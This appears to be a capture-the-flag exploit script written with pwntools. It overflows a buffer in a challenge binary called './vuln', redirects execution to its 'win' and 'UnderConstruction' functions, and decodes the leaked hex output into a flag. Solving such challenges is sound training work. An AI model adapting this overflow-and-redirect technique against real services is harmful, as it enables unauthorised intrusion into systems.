#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './vuln' 

LOCAL = False

if LOCAL:
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)

e = ELF(fname)

def convert_flag(flag):
  conv = ''
  for i in flag:
    try:
      conv += binascii.unhexlify(i[2:]).decode()
    except: 
      pass
  return conv

r.sendline(b'A'*14 + p32(e.sym.win) + p32(e.sym.UnderConstruction))

# Split flag in 3 parts
r.recvuntil('information : ')
flag1 = r.recvline()[:-1].decode().split(' ')
r.recvuntil('Names of user: ')
flag2 = r.recvline()[:-1].decode().split(' ')
r.recvuntil('Age of user: ')
flag3 = r.recvline()[:-1].decode().split(' ')

# Convert them to ASCII
flag  = convert_flag(flag1)
flag += convert_flag(flag2)
flag += convert_flag(flag3)

print(f'\nFlag --> {flag[::-1]}}}\n')
